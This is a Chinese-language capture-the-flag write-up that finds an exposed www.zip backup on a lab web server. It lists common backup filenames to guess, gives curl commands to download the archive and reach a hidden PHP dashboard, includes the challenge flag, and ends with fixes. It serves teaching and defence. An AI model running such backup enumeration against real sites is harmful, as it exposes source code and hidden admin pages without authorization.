# 12-brute-dir-backup 题解

## 题目

- 题号：12-brute-dir-backup
- 目标：http://47.120.76.57:33857/
- Flag：`TOGOGO-flag{d812e0a3-e086-4f45-8785-89ceb9436b17}`

## 解题思路

题名里有 `brute-dir-backup`，说明方向大概率是：

1. 目录/文件名爆破；
2. 找 Web 根目录下的备份文件；
3. 从备份源码里发现隐藏路径；
4. 访问隐藏路径拿 flag。

这题实际命中的是：

```text
/www.zip
```

压缩包里泄露了隐藏后台：

```text
sup3r_s3cr3t_dashboard.php
```

访问这个 PHP 文件即可拿到 flag。

## 手工复刻

### 1. 访问首页

```bash
curl -i http://47.120.76.57:33857/
```

可以看到只是一个维护/建设中的页面，没有明显 flag。

### 2. 尝试常见备份包

CTF 里 Web 备份常见名字有：

```text
www.zip
backup.zip
bak.zip
web.zip
site.zip
wwwroot.zip
source.zip
src.zip
```

先试 `www.zip`：

```bash
curl -I http://47.120.76.57:33857/www.zip
```

如果看到类似：

```text
HTTP/1.1 200 OK
Content-Type: application/zip
```

说明备份包存在。

### 3. 下载备份包

```bash
curl -o www.zip http://47.120.76.57:33857/www.zip
```

### 4. 查看压缩包内容

```bash
unzip -l www.zip
```

可以看到：

```text
sup3r_s3cr3t_dashboard.php
index.html
README.txt
```

这里最关键的是：

```text
sup3r_s3cr3t_dashboard.php
```

它看起来就是隐藏后台入口。

### 5. 访问隐藏后台

```bash
curl http://47.120.76.57:33857/sup3r_s3cr3t_dashboard.php
```

页面中可以看到：

```text
TOGOGO-flag{d812e0a3-e086-4f45-8785-89ceb9436b17}
```

## 自动化脚本

本目录下已经写好：

```text
main.py
```

运行：

```bash
cd /Users/zlux/Project/Active/gkdctf
source /Users/zlux/Project/Active/gkdctf/.venv/bin/activate 2>/dev/null || true
python3 main.py
```

预期输出：

```text
[+] 解题成功
backup: http://47.120.76.57:33857/www.zip
entry : http://47.120.76.57:33857/sup3r_s3cr3t_dashboard.php
flag  : TOGOGO-flag{d812e0a3-e086-4f45-8785-89ceb9436b17}
```

## 漏洞原因

网站把备份压缩包 `www.zip` 放在了 Web 根目录下，导致任何人都能下载源码/文件列表。

源码中又包含隐藏后台文件名，最终可以直接访问后台拿到 flag。

## 修复建议

真实业务中应当：

1. 不要把 `.zip`、`.tar.gz`、`.bak`、`.old` 等备份文件放在 Web 根目录；
2. Web 服务器禁止直接访问备份后缀；
3. 上线前扫描敏感文件；
4. 后台入口不能只靠“隐藏文件名”，应该加认证和权限控制。
